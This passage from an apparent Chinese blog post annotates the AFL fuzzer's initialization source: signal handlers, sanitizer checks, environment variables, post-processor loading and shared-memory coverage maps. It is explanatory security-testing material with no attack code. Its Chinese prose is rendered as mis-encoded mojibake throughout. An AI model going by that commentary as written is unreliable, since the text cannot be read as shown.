already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>


<p>æ¯”å¦‚è¯´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br><span class="line">$ AFL_AUTO afl-fuzz -m none -i samples/ -o fuzzout/ -M master_fuzzer -- /path/to/exe @@</span><br></pre></td></tr></table></figure>

<p><code>@@</code> ä»£è¡¨äº†ç¨‹åºçš„å‚æ•°ï¼Œæ˜¯ä¸ªå ä½ç¬¦ï¼Œä»<code>samples</code>ä¸‹çš„æ–‡ä»¶è¯»å–å†…å®¹</p>
<p>core_patternï¼šç”¨äºé…ç½®æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼ˆcore dumpï¼‰çš„å‘½åè§„åˆ™ã€‚æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶æ˜¯åœ¨ç¨‹åºå‘ç”Ÿä¸¥é‡é”™è¯¯ï¼ˆå¦‚æ®µé”™è¯¯ï¼‰æ—¶ç”Ÿæˆçš„å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼Œç”¨äºåˆ†æç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„é—®é¢˜ã€‚</p>
<h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p>æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set up signal handlers. More complicated that needs to be, because libc on</span></span><br><span class="line"><span class="comment">   Solaris doesn&#x27;t resume interrupted reads(), sets SA_RESETHAND when you call</span></span><br><span class="line"><span class="comment">   siginterrupt(), and does other unnecessary things. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line"></span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Various ways of saying &quot;stop&quot;. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exec timeout notifications. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Window resize */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGUSR1: skip entry */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Things we don&#x27;t care about. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h3><p>æ£€æŸ¥ASAN&#x2F;MSANç›¸å…³çš„å‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p>å½“ä½¿ç”¨ Slave fuzzeræ—¶ï¼Œ<code>-S syncid</code>ï¼Œä¸ºå…¶åˆå§‹åŒ–output dirã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Validate and fix up out_dir and sync_dir when using -S. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    x++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line"></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h3><p>ç¯å¢ƒå˜é‡å¤„ç†</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzzer input å’Œ output ä¸èƒ½è®¾ç½®ç›¸åŒçš„ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// dump mode: dump_modeå³æ²¡æœ‰æ’æ¡©å’Œç¡®å®šæ€§(deterministic)å˜å¼‚é˜¶æ®µçš„æ¨¡å¼ï¼Œé»‘ç›’æµ‹è¯•</span></span><br><span class="line">  <span class="comment">// crash mode: å½“ç¨‹åºå› è¾“å…¥æ•°æ®è€Œå´©æºƒæ—¶ï¼ŒAFL ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•ä¸‹æ¥ï¼Œä»¥ä¾¿åç»­è¿›è¡Œåˆ†æã€‚</span></span><br><span class="line">  <span class="comment">// qemu mode: qemu æ¨¡å¼</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// hang è¶…æ—¶æ—¶é—´</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬æƒ³è¦ç»™ç¨‹åºæ·»åŠ Â <code>LD_PRELOAD</code>ï¼Œæ­£ç¡®æ–¹å¼æ˜¯è®¾ç½®Â <code>AFL_PRELOAD</code>Â ç¯å¢ƒå˜é‡</p>
<h3 id="cmdline-banner-checktty"><a href="#cmdline-banner-checktty" class="headerlink" title="cmdline&#x2F;banner&#x2F;checktty"></a>cmdline&#x2F;banner&#x2F;checktty</h3><p>ä¿å­˜å‘½ä»¤è¡Œå‚æ•°åˆ°ä¸€ä¸ªbufferé‡Œ</p>
<p>bannerï¼šAFLå›¾å½¢åŒ–ç•Œé¢</p>
<p>tty</p>
<ul>
<li>å¦‚æœ<code>AFL_NO_UI</code>ç¯å¢ƒå˜é‡å­˜åœ¨ï¼Œåˆ™è®¾ç½®<code>not_on_tty = 1</code></li>
<li>ioctlè·å–<code>TIOCGWINSZ</code>ï¼Œå¦‚æœæŠ¥é”™åˆ™è¡¨ç¤ºå½“å‰ä¸åœ¨ttyä¸Šè¿è¡Œï¼Œè®¾ç½®<code>not_on_tty = 1</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_if_tty</span>();</span><br></pre></td></tr></table></figure>

<h3 id="bind-cpu-core"><a href="#bind-cpu-core" class="headerlink" title="bind cpu core"></a>bind cpu core</h3><p>ç»‘å®šä¸€ä¸ªCPUæ ¸å¿ƒï¼Œfuzzer æ£€æŸ¥ç³»ç»Ÿçš„è´Ÿè½½ï¼ŒæŠŠè‡ªå·±ç»‘å®šåˆ°ä¸€ä¸ªç©ºé—² cpu æ ¸å¿ƒä¸Šã€‚å¦å¤–ï¼Œè‹¥ cpu é¢‘ç‡å¯è°ƒï¼Œåˆ™å»ºè®®ç”¨æˆ·å°†å…¶å®šåœ¨æœ€é«˜é¢‘ç‡ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  <span class="comment">// ç¡®ä¿æ ¸å¿ƒè½¬å‚¨ä¸ä¼šè¿›å…¥ç¨‹åº ä¹Ÿå°±æ˜¯ core pattern è®¾ç½®</span></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="comment">// æ£€æŸ¥CPUè°ƒèŠ‚å™¨</span></span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br></pre></td></tr></table></figure>

<h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup post"></a>setup post</h3><p>è‹¥æœ‰ç¯å¢ƒå˜é‡Â <code>AFL_POST_LIBRARY</code>Â ï¼Œåˆ™è°ƒç”¨Â <code>dlopen</code>Â æŒ‚è½½è¿™ä¸ª libï¼Œå°†å…¨å±€å˜é‡Â <code>post_handler</code>Â æŒ‡å‘ lib ä¸­çš„Â <code>afl_postprocess</code>å‡½æ•°ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// AFL_POST_LIBRARY</span></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">setup_post</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* dh;</span><br><span class="line">  u8* fn = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_POST_LIBRARY&quot;</span>);</span><br><span class="line">  u32 tlen = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  dh = <span class="built_in">dlopen</span>(fn, RTLD_NOW);</span><br><span class="line">  <span class="keyword">if</span> (!dh) <span class="built_in">FATAL</span>(<span class="string">&quot;%s&quot;</span>, <span class="built_in">dlerror</span>());</span><br><span class="line"></span><br><span class="line">  post_handler = <span class="built_in">dlsym</span>(dh, <span class="string">&quot;afl_postprocess&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!post_handler) <span class="built_in">FATAL</span>(<span class="string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do a quick test. It&#x27;s better to segfault now than later =) */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">post_handler</span>(<span class="string">&quot;hello&quot;</span>, &amp;tlen);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Postprocessor installed successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ fuzzer å˜å¼‚å‡ºä¸€ä¸ªæ–°çš„ç”¨ä¾‹ã€å³å°†äº¤ç»™ç›®æ ‡ç¨‹åºæ‰§è¡Œæ—¶ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚æ‰€ä»¥ï¼Œå‡å¦‚ç”¨æˆ·æƒ³è¦å¯¹ AFL å˜å¼‚å‡ºçš„ç”¨ä¾‹è¿›è¡Œæ“ä½œâ€”â€”ä¾‹å¦‚å°†å…¶è®°å½•åˆ°æ•°æ®åº“ä¸­â€”â€”å°±å¯ä»¥é€šè¿‡ä¸ä¿®æ”¹ AFL æºç çš„æ–¹å¼å®ç°ã€‚ç”¨æˆ·åªéœ€å†™ä¸€ä¸ªÂ <code>post_handler</code>ï¼Œç¼–è¯‘æˆåŠ¨æ€é“¾æ¥åº“ï¼Œé€šè¿‡Â <code>AFL_POST_LIBRARY</code>Â å‘ŠçŸ¥ AFLã€‚</p>
<h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup shm"></a>setup shm</h3><p>shm: AFLæ ¹æ®äºŒå…ƒtupleï¼ˆè·³è½¬çš„æºåœ°å€å’Œç›®æ ‡åœ°å€ï¼‰æ¥è®°å½•åˆ†æ”¯ä¿¡æ¯ï¼Œä»è€Œè·å–targetçš„æ‰§è¡Œæµç¨‹å’Œä»£ç è¦†ç›–æƒ…å†µã€‚èµ·å§‹é˜¶æ®µÂ <code>fuzzer</code>Â ä¼šè¿›è¡Œä¸€ç³»åˆ—çš„å‡†å¤‡å·¥ä½œï¼Œä¸ºè®°å½•æ’æ¡©å¾—åˆ°çš„ç›®æ ‡ç¨‹åºæ‰§è¡Œè·¯å¾„ï¼Œå³Â <code>tuple</code>Â ä¿¡æ¯ã€‚</p>
<ul>
<li><code>trace_bits</code>Â æŒ‡å‘å…±äº«å†…å­˜çš„æŒ‡é’ˆï¼Œç”¨äºè¿›ç¨‹é—´é€šä¿¡ </li>
<li><code>virgin_bits</code>Â ç”¨æ¥è®°å½•æ€»çš„tupleä¿¡æ¯ï¼›  </li>
<li><code>virgin_tmout</code>Â è®°å½•fuzzè¿‡ç¨‹ä¸­å‡ºç°çš„æ‰€æœ‰ç›®æ ‡ç¨‹åºçš„timeoutæ—¶çš„tupleä¿¡æ¯ï¼›  </li>
<li><code>virgin_crash</code>Â è®°å½•fuzzè¿‡ç¨‹ä¸­å‡ºç°çš„crashæ—¶çš„tupleä¿¡æ¯ï¼›</li>
</ul>
<p>è¿™é‡Œç›´æ¥åˆ›å»ºä¸€ä¸ªå…±äº«å†…å­˜ï¼ŒåŒå­è¿›ç¨‹forkserverä¸­Â <code>__afl_global_area</code>Â æŒ‡å‘çš„åŒºåŸŸè¿›è¡Œå…±äº«</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = <span class="built_in">shmget</span>(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// atexit ä¸ºç¨‹åºé€€å‡ºæ—¶æ³¨å†Œçš„å‡½æ•°ï¼Œä¼šåœ¨exitå‰æ‰§è¡Œ</span></span><br><span class="line">  <span class="built_in">atexit</span>(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line">  <span class="comment">// ç¯å¢ƒå˜é‡</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) <span class="built_in">setenv</span>(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>trace_bits</code>ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è®°å½•æ˜¯å¦åˆ°è¾¾è¿™ä¸ªè·¯å¾„ï¼Œå’Œè¿™ä¸ªè·¯å¾„è¢«å‘½ä¸­äº†å¤šå°‘æ¬¡çš„ï¼Œè€Œè¿™ä¸ªæ¬¡æ•°åœ¨0-255ä¹‹é—´ï¼Œä½†æ¯”å¦‚ä¸€ä¸ªå¾ªç¯ï¼Œå®ƒå¾ªç¯5æ¬¡å’Œå¾ªç¯6æ¬¡å¯èƒ½æ˜¯å®Œå…¨ä¸€æ ·çš„æ•ˆæœï¼Œä¸ºäº†é¿å…è¢«å½“æˆä¸åŒçš„è·¯å¾„ï¼Œæˆ–è€…è¯´å°½å¯èƒ½å‡å°‘å› ä¸ºå‘½ä¸­æ¬¡æ•°å¯¼è‡´çš„åŒºåˆ«ã€‚</p>
<p>åœ¨æ¯æ¬¡å»è®¡ç®—æ˜¯å¦å‘ç°äº†æ–°è·¯å¾„ä¹‹å‰ï¼Œå…ˆæŠŠè¿™ä¸ªè·¯å¾„å‘½ä¸­æ•°è¿›è¡Œè§„æ•´ï¼Œæ¯”å¦‚æŠŠå‘½ä¸­5æ¬¡å’Œ6æ¬¡éƒ½ç»Ÿä¸€è®¤ä¸ºæ˜¯å‘½ä¸­äº†8æ¬¡ï¼Œä¸€å­—èŠ‚å®½çš„å˜é‡æŒ‰å¦‚ä¸‹æ˜ å°„ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ï¼Ÿ æ•°ç»„è¿˜èƒ½è¿™æ ·åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line">      [<span class="number">0</span>]           = <span class="number">0</span>, <span class="comment">// 00000000</span></span><br><span class="line">      [<span class="number">1</span>]           = <span class="number">1</span>, <span class="comment">// 00000001</span></span><br><span class="line">      [<span class="number">2</span>]           = <span class="number">2</span>, <span class="comment">// 00000010</span></span><br><span class="line">      [<span class="number">3</span>]           = <span class="number">4</span>, <span class="comment">// 00000100</span></span><br><span class="line">      [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, <span class="comment">// 00001000</span></span><br><span class="line">      [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,<span class="comment">// 00010000</span></span><br><span class="line">      [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,<span class="comment">// 00100000</span></span><br><span class="line">      [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,<span class="comment">// 01000000</span></span><br><span class="line">      [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span><span class="comment">// 10000000</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å‘½ä¸­ç‡ç»Ÿè®¡</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++) </span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">        (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        count_class_lookup8[b2];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="setup-dirs"><a href="#setup-dirs" class="headerlink" title="setup dirs"></a>setup dirs</h3><p>åˆ›å»ºè¾“å‡ºçš„ç›®å½•ï¼Œå­˜åœ¨å‡ ä¸ªç›®å½•</p>
<ul>
<li>queueï¼šè¾“å…¥é˜Ÿåˆ—</li>
<li>crashes: è®°å½•ç€æ‰€æœ‰çš„crashè¾“å…¥</li>
<li>hangsï¼šåŒä¸Šï¼Œè®°å½•æ‰€æœ‰çš„hangè¾“å…¥</li>
</ul>
<h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read testcases"></a>read testcases</h3><p>æŠŠåˆå§‹è¯­æ–™é›†è¯»è¿› queue é‡Œ</p>
